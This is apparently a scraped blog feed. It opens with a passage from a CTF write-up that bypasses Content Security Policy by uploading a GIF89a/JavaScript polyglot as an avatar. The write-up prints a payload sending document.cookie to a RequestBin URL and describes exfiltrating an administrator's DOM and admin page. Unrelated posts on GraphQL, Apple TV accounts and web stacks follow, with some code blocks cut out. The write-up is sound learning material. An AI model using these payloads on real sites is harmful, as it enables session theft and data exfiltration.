  <span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/div&gt;</span>
</code></pre></div>
<p>Looking at the developer console gave me some more insight. Apparently this site had <a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> enabled, and it was blocking my payload.</p>

<blockquote>
<p>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src &#39;self&#39;&quot;. Either the &#39;unsafe-inline&#39; keyword, a hash (&#39;sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M=&#39;), or a nonce (&#39;nonce-...&#39;) is required to enable inline execution.</p>
</blockquote>

<p>Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:</p>
<div class="highlight"><pre><code class="language-" data-lang="">Content-Security-Policy:
  default-src 'none';
  img-src 'self' placehold.it *.imgix.net;

<p>Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from <code>self</code>.</p>

<p>How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.</p>

<p>Using the <code>GIF89a</code> format (which conveniently starts with it&#39;s name, then the rest is the GIF payload) I constructed and uploaded my new &#39;avatar&#39; <code>pwn.gif</code>, designed to steal cookies via <a href="http://requestb.in/">RequestBin</a>:</p>
<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">'http://requestb.in/secretcode?c='</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
</code></pre></div>
<p>This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new &#39;avatar&#39; by sending myself a test message:</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://example.com/uploads/filenamehash.gif"</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div>
<p>Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:</p>

<blockquote>
<p>Refused to execute script from &#39;<a href="http://example.com/uploads/filenamehash.gif">http://example.com/uploads/filenamehash.gif</a>&#39; because its MIME type (&#39;image/gif&#39;) is not executable.</p>
</blockquote>

<p>This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that <code>HttpOnly</code> flag first.. Sometimes I just get caught up in the heat of the moment.</p>

<p>Ok.. so we couldn&#39;t steal the cookies.. but what could we do? <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-Site Request Forgery (CSRF)</a> maybe? There was a CSRF token designed to prevent this, but it didn&#39;t seem to get validated. That&#39;s good.. but what should we target?</p>

<p>Needing some better visibility on the situation, I decided to just steal the whole <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM</a> and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):</p>

</code></pre></div>
<p>Ignoring my rusty JavsScript, the new payload would create a HTML <code>form</code> element with a <code>textarea</code>, grab the entire contents of the DOM, <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa">Base64 encode</a> them, stick them in the <code>textarea</code>, inject the <code>form</code> into the page, then send that off to RequestBin.</p>

<p>After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"admin.php"</span><span class="nt">&gt;</span>Administration<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
</code></pre></div>
<p>Sweet, let&#39;s find something juicy on that page! Reworking the payload (with a little help from <a href="https://api.jquery.com/jquery.get/">JQuery</a> that was already on the site):</p>
<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>

  <span class="p">});</span>
<span class="p">};</span>
</code></pre></div>
<p>Using the last payload as the template, I updated it to load the <code>admin.php</code> page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn&#39;t even a need to do anything else:</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;legend&gt;</span>
  <span class="nt">&lt;h3&gt;</span>Administration<span class="nt">&lt;/h3&gt;</span>
<span class="nt">&lt;/legend&gt;</span>
<span class="nt">&lt;h4&gt;</span>flag{the-secret-flag-code}<span class="nt">&lt;/h4&gt;</span>
</code></pre></div>
<p>Mischief managed!</p>

<h2>Raw Notes</h2>

<p>I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:</p>

<ul>
<li>Administrator is online</li>
<li>We can send messages to users</li>
<li>We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self</li>
<li>We can upload image files (can we make that other types?)

<ul>
<li>GIF89a based XSS, won&#39;t exec in chrome though..</li>
</ul></li>
<li>Administrator will read messages we send them (check the &#39;sent&#39; page)</li>
<li>Admin isn&#39;t using chrome! :p</li>
<li>The request doesn&#39;t send us any cookies! :( (they&#39;re HTTP only)</li>
<li>CSRF token doesn&#39;t seem to actually be validated.. What can we CSRF..?</li>
<li>Use the XSS to send us the admin&#39;s DOM</li>
<li>Seems there&#39;s an admin.php page..</li>
<li>Ajax the admin page</li>
<li>Success!</li>
</ul>

<h2>Conclusion</h2>

<p>This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.</p>

<p>Has this helped you learn something new? Got a better way to approach it? I&#39;d love to hear from you in the comments!</p>

	     <p>If you haven&#39;t yet come across <a href="http://graphql.org/">GraphQL</a>, it&#39;s kind of exciting stuff. It&#39;s a query language developed by <a href="https://code.facebook.com/posts/">Facebook</a>, that basically lets you request exactly the data you need for the given task; no more, no less. Sounds good right?</p>

<h2>Tell me more..</h2>

<p>If you like to get into the nitty gritty of tech specs, you can head over to the <a href="https://facebook.github.io/graphql/">GraphQL Working Draft</a> (<a href="https://github.com/facebook/graphql">GitHub</a>) to have a deeper read, then play around with the <a href="https://github.com/graphql/graphql-js">reference implementation</a> in JavaScript.</p>

<p>Though if specs aren&#39;t really your style, check out &#39;<a href="https://learngraphql.com/">Learn GraphQL</a>&#39; and give their free short course a run through. Should get you up to speed!</p>

<h2>Ok. I&#39;m in!</h2>

<p>Excited? Want to dive into it? Need libraries for your particular tech stack? Head on over to the <a href="https://github.com/chentsulin/awesome-graphql">Awesome GraphQL</a> list. You&#39;re bound to find what you need!</p>

<p>For my particular tech palette I was after something <a href="http://scala-lang.org/">Scala&#39;esque</a>, maybe some <a href="http://doc.akka.io/docs/akka/2.4/scala/http/">Akka-HTTP</a> to go with it. Seems I wasn&#39;t the only one! <a href="http://sangria-graphql.org/">Sangria</a> (<a href="https://github.com/sangria-graphql/sangria">GitHub</a>) is a Scala GraphQL implementation. They even have <a href="https://github.com/sangria-graphql/sangria-akka-http-example">an Akka-HTTP based example</a>. Perfect! Throw in a little <a href="https://github.com/sangria-graphql/sangria-relay">Relay support</a> and this package is pretty much complete.</p>

<p>If you&#39;re looking for an all-in-one stack heading forward, I keep seeing a lot of good things posted by the team at <a href="http://www.apollostack.com/">Apollo Stack</a> (by the <a href="https://www.meteor.com/">Meteor</a> team), so would most definitely recommend keeping an eye on them. They also post a lot of really good articles <a href="https://medium.com/apollo-stack">on their blog</a> too.</p>

<p>For some further reading, make sure to check out:</p>

<ul>
<li><a href="https://medium.com/apollo-stack/tutorial-building-a-graphql-server-cddaa023c035">&quot;Tutorial: How to build a GraphQL server&quot; by Jonas Helfer</a></li>
</ul>

<h2><a name="graphql-relay-redux"></a>GraphQL and Relay.. What about Redux?</h2>

<p>A lot of things you&#39;ll read about GraphQL on the net will talk about it quite closely with <a href="https://facebook.github.io/relay/">Relay</a>, and given they were both released by Facebook, and sort of designed to work together, it makes a lot of sense. That said, you most definitely don&#39;t need to use Relay to take advantage of the awesomeness GraphQL provides!</p>

<p>KADIRA states it pretty well in <a href="https://kadira.io/blog/graphql/graphql-vs-relay">GraphQL vs Relay</a>:</p>

<blockquote>
<p>GraphQL provides a way to model and expose data in your app. You can use it on top of any kind of data source and use it with any kind of transport layer.</p>

<p>Relay is an efficient client-side data-fetching technology built for React. It talks to a GraphQL Schema to get data. Relay also has a server-side part that adds some features on top of GraphQL.</p>
</blockquote>

<p>There is a bunch of talk about how Relay is currently a pain to use, but Facebook seems to be <a href="https://facebook.github.io/react/blog/2016/08/05/relay-state-of-the-state.html">well aware of this issue</a> and has future plans to make it much nicer to work with.</p>

<p>I think it&#39;s definitely worth keeping an eye on Relay in the future, but if you&#39;re not quite ready to jump in, you can always take advantage of the benefits of GraphQL while sticking to something like <a href="http://redux.js.org/">Redux</a> (<a href="https://github.com/reactjs/redux">GitHub</a>).

<h2>GraphQL vs Falcor</h2>

<p>So by now we should have a fairly good idea about what <a href="http://graphql.org/">GraphQL</a> is. So what&#39;s <a href="http://netflix.github.io/falcor/">Falcor</a>? This one comes from our friends over at <a href="http://techblog.netflix.com/">Netflix</a>. In essence, it turns all of your data sources into one giant JSON graph. Regardless of whether you&#39;re loading data remotely, have it cached locally, etc; you&#39;ll access it in the same way.</p>

<p>If you want to read deeper, I found these to be quite useful:</p>

<ul>
<li><a href="https://stackoverflow.com/questions/32057785/what-is-the-difference-between-falcor-and-graphql">&quot;What is the difference between Falcor and GraphQL?&quot; on StackOverflow</a></li>
<li><a href="https://medium.com/apollo-stack/graphql-vs-falcor-4f1e9cbf7504">&quot;GraphQL vs. Falcor&quot; by Jonas Helfer</a></li>
<li><a href="http://react-etc.net/entry/beyond-rest-graphql-vs-falcor">&quot;Beyond REST: GraphQL vs. Falcor&quot; by React-Etc</a></li>
</ul>

<p>The consensus that I came to is that it seems to be on par with GraphQL in a number of ways, but is probably a bit easier to implement and a bit less powerful overall. Apparently you could even go so far as to <a href="http://hueypetersen.com/posts/2015/10/26/querying-graphql-with-falcor/">query GraphQL with Falcor</a>, but not the other way. For my purposes, I think I&#39;ll be sticking with GraphQL.</p>

<p>It&#39;s also worth noting that Facebook has been using various flavours of GraphQL for a few years now, whereas Netflix is yet to (or has only recently) started using Falcor in production.</p>

<h2>API&#39;s: REST, HATEOS, Observables.. GraphQL!</h2>

<p>I have read SO many articles over the years about the &#39;proper&#39; way to design API&#39;s, and why styleX is so much better than styleY. With so much info out there, and so much conflicting advice (even within each supposed style), it&#39;s really easy to get stuck in analysis paralysis.</p>

<p>Greg Ziegan put together a <a href="https://medium.com/@gregoryziegan/how-graphql-taught-me-to-code-client-apps-1c631a9953bd">nice little article</a> talking about his progression along this path: from REST, through <a href="http://timelessrepo.com/haters-gonna-hateoas">HATEOS</a>, observables, etc; and how he ended up at GraphQL. Following on from this, Sashko Stubailo makes a pretty good argument about why GraphQL is <a href="https://medium.com/apollo-stack/graphql-the-next-generation-of-api-design-f24b1689756a">&quot;the next generation of API design&quot;</a>.</p>

<p>While the benefits of a GraphQL-based API seem pretty obvious to me, it&#39;s not always feasible to jump straight into shiny new tech. Maybe you need to support legacy services, interact with 3rd-party API&#39;s, or allow other developers to consume your API without them having to learn the ins and outs of GraphQL. But thankfully, we don&#39;t need to pick one over the other!</p>

<p>The GraphQL team have a pretty good article on their blog about <a href="http://graphql.org/blog/rest-api-graphql-wrapper/">wrapping REST API&#39;s in GraphQL</a>, starting purely with the client-side, and later moving it to the backend. This idea plays in SO well with some little side-projects I&#39;ve been thinking about over the years, and how it could be used to help decompose and combine existing API&#39;s.</p>

<h2>Conclusion</h2>

<p>This is a scattering of the articles and things I have read through while learning more about GraphQL, and why it is so awesome. I definitely know it&#39;s a technology that I am super excited to start utilising in my future projects.</p>

<p>Have you come across any other awesome articles/tools related to GraphQL or similar? I&#39;d love to hear about them! Let me know in the comments below.</p>

	  <description><![CDATA[
	     <p>Living in share houses and using tech like the Apple TV has highlighted an annoying situation: so many apps these days want you to sign in to enable access, personalised features, etc; but most offer no good solution for when you share the device with other people.</p>

<p>There are some apps out there that handle this pretty well:</p>

<ul>
<li><a href="https://www.plex.tv/">Plex</a> allows you to switch between different users in your &#39;home&#39;, each of which can either be a fully independent account, or a &#39;managed user&#39; that exists under the main account.</li>
<li><a href="https://www.netflix.com/au/">Netflix</a> allows switching between different users under the one subscription. While this is ok.. it doesn&#39;t work so well for a share house. What if we each have our own Netflix subscriptions, but want to share the device without having to log out and back in to our own accounts?</li>
</ul>

<p>And then there are so many apps that don&#39;t even seem to give the option, two of which immediately jump to mind for me:</p>

<ul>
<li><a href="https://www.youtube.com/">YouTube</a> let&#39;s you sign in to a single account, but no switching features save for logging out.</li>
<li><a href="https://www.ted.com/">TED</a>&#39;s app suffers from the same issue.</li>
</ul>

<p>This could be fixed at the individual app level. It would be REALLY nice to see support for multiple account switching added to any app made for a device that could potentially be shared (Apple TV/etc, far less likely to be useful on an iPhone.. but it might be for some users) But this requires extra effort from every app developer out there. Perhaps a common framework could be developed to help support this.. but then making it generic enough to fit into everyone&#39;s different architectures would be a challenge.</p>

<p>An even better solution could be baked into the OS itself by Apple.. I boot up my Apple TV and am presented with an account chooser asking which particular registered user I am. If I haven&#39;t already logged in, there&#39;s the option for signing in to my Apple account to add myself as a new user. Once logged in, I&#39;m presented with my own homescreen of apps, laid out to my own preferences, logged in to my own accounts, and saving my own personal data.</p>

<p>This poses some issues about duplication of apps between users, space requirements, etc. So a mid-ground could be allowing the owner/&#39;master&#39; user to control app installation, but then for each other user to be able to maintain their own stored data/signin status/etc.</p>

<p>What do you think? Is this a feature you&#39;d use, or does it just seem like over-engineered bloat? Let me know your thoughts in the comments!</p>

	     <p>Finding myself with some free time (and looking into starting a new project), I thought I might catch myself up on the state of web technologies, and what might be a good stack to work with.</p>

<p>The details collected here are most certainly not a complete layout of the entire landscape, and there will no doubt be leanings toward my personal tastes (<a href="http://www.reactivemanifesto.org/">reactive</a>, api-driven, etc). You should use this more as a starter into your own deeper research than as a source of ultimate truth. With that out of the way, let&#39;s get into it!</p>

<h2><a name="frontend"></a>Frontend</h2>

<p>The frontend is the pretty, interactive, main part that people will be seeing. You can have the most amazingly streamlined and perfect backend code, but noone&#39;s going to notice and love it without a strong frontend to back it up.</p>

<p><strong><a name="frontend-frameworks"></a>Frameworks</strong></p>

<p>The days of raw JavaScript and jQuery selectors is long gone. We&#39;re looking for a nice, modern framework to help put together our frontend. Here&#39;s a little selection of some of our options:</p>

<ul>
<li><a href="https://facebook.github.io/react/">React</a> (<a href="https://github.com/reactjs">GitHub</a>) (most likely with a flavour of <a href="https://facebook.github.io/flux/">Flux</a> (<a href="https://github.com/facebook/flux">GitHub</a>))

<ul>
<li>A frontend framework from Facebook that is taking the web by storm. Probably my personal favourite from what I&#39;ve seen so far.</li>
<li>It even let&#39;s you <a href="https://facebook.github.io/react-native/">build for native devices</a>!</li>
</ul></li>
<li><a href="https://angular.io/">Angular (v2)</a> (or if you like outdated for some reason <a href="https://angularjs.org/">AngularJS (v1)</a>)

<ul>
<li>Also <a href="https://mobile.angular.io/">available for native devices</a></li>
<li>I was a big fan of AngularJS (v1), and I want to like v2, but I don&#39;t think it will be my main choice.</li>
</ul></li>
<li>There are a TON of other frontend frameworks, of varying popularity and support. I won&#39;t delve into them much, but there&#39;s heaps of info out there

<ul>
<li><a href="http://emberjs.com/">Ember</a></li>
<li><a href="https://vuejs.org/">Vue.js</a>

<ul>
<li>From reading around the web, there&#39;s a decent amount of good stuff talking about Vue. In the end I decided against it since it&#39;s not supported by a big backer, and the skills aren&#39;t as useful on a resume. That said, for a personal project it could be a great fit!</li>

</ul>

<p>As with most things, every man and his dog has their own opinion, so here are a few comparisons I found useful:</p>

</ul>

<p><strong><a name="frontend-ui"></a>UI</strong></p>

<p>Even if you like to go oldschool and code your site by hand in notepad/vi, you can&#39;t deny the ease/benefits of using a frontend UI framework.</p>

<ul>
<li><a href="https://getbootstrap.com/">Bootstrap</a> (<a href="https://blog.getbootstrap.com/2015/08/19/bootstrap-4-alpha/">v4</a>)

<ul>
<li>Released by Twitter, and arguably one of the most used frontend UI frameworks out there.</li>
<li><a href="https://react-bootstrap.github.io/">React-Bootstrap</a> (<a href="https://github.com/react-bootstrap/react-bootstrap">GitHub</a>)</li>
<li><a href="https://ng-bootstrap.github.io/#/home">ng-bootstrap</a> by the angular-ui team (<a href="https://github.com/ng-bootstrap/ng-bootstrap">GitHub</a>)</li>

</ul></li>
<li><a href="http://foundation.zurb.com/">Foundation</a>

<ul>
<li>While not as well known as the other two mentioned here, those that make use of foundation swear by it.</li>
<li><a href="https://react.foundation/">React-Foundation</a> (<a href="https://github.com/nordsoftware/react-foundation">GitHub</a>)</li>
<li><a href="https://aruberto.github.io/react-foundation-components/">React-Foundation-Components</a></li>
</ul></li>
<li><a href="https://material.google.com/">Material Design</a>

<ul>
<li>Following a set of design principals from Google, this lays out a slick, consistent look and feel.</li>

<p><strong><a name="frontend-scripting"></a>Scripting</strong></p>

<p>Modern web apps live by the functionality they enable in the browser, and to do this, we need a JS-esque language. Your chosen frontend framework may sway your choice (eg. Angular (v2) has a strong preference for TypeScript), but ultimately, it&#39;s up to what you/your team feel comfortable with. With <a href="https://github.com/jashkenas/coffeescript/wiki/list-of-languages-that-compile-to-js">so many options</a> out there, it&#39;s hard to pick.. And of course, you could always stick to plain JavaScript.. and with the new features coming in <a href="http://es6-features.org/">ES6</a> (eg. <a href="http://www.html5rocks.com/en/tutorials/es6/promises/">promises</a>) and beyond, it might be a good choice.</p>

<ul>
<li><a href="https://babeljs.io/">Babel</a>

<ul>
<li>A transpiler that lets you play with all the fun features of JavaScript ES6 and beyond, while maintaining compatibility with all of the older browsers.</li>
</ul></li>
<li><a href="https://www.typescriptlang.org/">TypeScript</a> (<a href="https://github.com/Microsoft/TypeScript">GitHub</a>)

<ul>
<li>&quot;TypeScript is a typed superset of JavaScript that compiles to plain JavaScript&quot;</li>
<li>If you&#39;re using Angular (v2) and like sticking to convention, this is the one for you.</li>
</ul></li>
<li><a href="http://coffeescript.org/">CoffeeScript</a> (or maybe <a href="https://github.com/michaelficarra/CoffeeScriptRedux">v2</a>)

<ul>
<li>This used to be my choice, but looking at the other options available now, I think i&#39;ll be moving on.</li>
<li>As always, there are a bunch of arguments for and against..

<ul>
<li><a href="https://robots.thoughtbot.com/replace-coffeescript-with-es6">&quot;Replace CoffeeScript with ES6&quot; by Blake Williams</a></li>
<li><a href="http://tech.noredink.com/post/111583727108/dont-replace-coffeescript-with-es6-transpilers">&quot;Don’t Replace CoffeeScript with ES6 Transpilers&quot; by Richard Feldman</a></li>
<li>etc</li>
</ul></li>
<li>If you&#39;re looking for a way out, why not <a href="https://github.com/decaffeinate/decaffeinate">decaffeinate</a>?</li>
</ul></li>
<li><a href="https://flowtype.org/">Flow</a> (<a href="https://github.com/facebook/flow">GitHub</a>)

<ul>
<li>While it&#39;s not a language unto itself, it does allow you the benefits of typed JavaScript without having to dive into something like TypeScript.</li>
</ul></li>
<li><a href="https://www.scala-js.org/">Scala.js</a>

<ul>
<li>A little left field, this transpiles Scala code into JavaScript. While I probably wouldn&#39;t see myself using this as a main choice, it could make for some interesting reusability between front and backend.</li>
</ul></li>
</ul>

<h2><a name="backend"></a>Backend</h2>

<p>My preferences for backend tech stacks lean heavily towards <a href="http://www.scala-lang.org/">Scala</a> and the <a href="https://www.lightbend.com/platform">Lightbend Reactive Platform</a> these days, but I will make quick mention of some of the other options available.</p>

<ul>
<li><a href="http://doc.akka.io/docs/akka-http/current/scala.html">Akka-HTTP</a>

<ul>
<li>Taking the power of asynchronous, message based actors, and applying them to HTTP. Definite win.</li>
<li><a href="https://softwaremill.github.io/bootzooka/">Bootzooka</a> (<a href="https://github.com/softwaremill/bootzooka">GitHub</a>)

<ul>
<li>&quot;Bootzooka is a simple application scaffolding project to allow quick start of development for modern, web based applications.&quot;</li>
<li>While not perfect, it&#39;s a decent implementation of a starter app, tying together some useful technologies.</li>
</ul></li>
</ul></li>
<li><a href="https://www.playframework.com/">Play Framework</a>

<ul>
<li>&quot;Play is a high-productivity Java and Scala web application framework that integrates the components and APIs you need for modern web application development.&quot;</li>
</ul></li>
<li><a href="http://scalatra.org/">Scalatra</a>

<ul>
<li>&quot;Scalatra is a simple, accessible and free web micro-framework. It combines the power of the JVM with the beauty and brevity of Scala, helping you quickly build high-performance web sites and APIs.&quot;</li>
</ul></li>

<li>&quot;Lift is the most powerful, most secure web framework available today. There are Seven Things that distinguish Lift from other web frameworks.&quot;</li>
</ul></li>

<ul>
<li>&quot;A typeful, purely functional, streaming library for HTTP clients and servers in Scala.&quot;</li>
</ul></li>
<li><a href="https://twitter.github.io/finatra/">Finatra</a>

<ul>
<li>&quot;Fast, testable, Scala services built on TwitterServer and Finagle.&quot;</li>
</ul></li>
<li><a href="https://github.com/airbnb/hypernova">Hypernova</a>

<ul>
<li>&quot;A service for server-side rendering your JavaScript views&quot;</li>
<li>While not a choice unto itself, this should help speed things up and keep your site nice and search engine friendly.</li>
</ul></li>
<li>There will be a number of opinions spread throughout the net, including:

<li>etc</li>
</ul></li>
</ul>

<h2><a name="tooling"></a>Tooling</h2>

<p>With the crazy mix of technologies and steps involved in modern web app development, it makes a ton of sense to tie it all together with some automation.</p>

<ul>
<li><a href="https://webpack.github.io/">Webpack</a> (<a href="https://github.com/webpack/webpack">GitHub</a>)

<ul>
<li>&quot;Webpack is a bundler for modules. The main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset.&quot;</li>
<li><a href="http://blog.andrewray.me/webpack-when-to-use-and-why/">&quot;Webpack: When To Use And Why&quot; by Andrew Ray</a></li>

<li><a href="https://github.com/shakacode/bootstrap-loader">https://github.com/shakacode/bootstrap-loader</a></li>
</ul></li>
<li><a href="http://gulpjs.com/">Gulp</a> (<a href="https://github.com/gulpjs/gulp">GitHub</a>

<ul>
<li>Gulp is a streaming javascript task runner that lets you automate tasks.</li>
</ul></li>
<li><a href="http://gruntjs.com/">Grunt</a> (<a href="https://github.com/gruntjs/">GitHub</a>)

<ul>
<li>Grunt is basically the older, less streaming, less awesome version of Gulp.</li>
</ul></li>
</ul>

<p>While a little different in purpose to the things mentioned above, getting everything nicely tested and deployed is always good:</p>

<ul>
<li><a href="https://bitbucket.org/product/features/pipelines">Bitbucket Pipelines</a>: &quot;Build, test and deploy from Bitbucket&quot;</li>
</ul>

<h2><a name="conclusions"></a>Conclusions</h2>

<p>Hopefully this has given you a decent starting point for figuring out what combination of technologies is going to work best for your next project. If you want to see the direction I&#39;ve decided to go, make sure you read on in <a href="#TODO">Part 2</a>.</p>

<p>Have I missed something important? Not given love to your favourite stack? Got a cool pointer? Or just want to say hi? Let me know in the comments!</p>

<h2><a name="updates"></a>Updates</h2>

<ul>
<li>2017-04-11 Added some more backend web frameworks, updated akka-http link, fixed some formatting</li>
</ul>
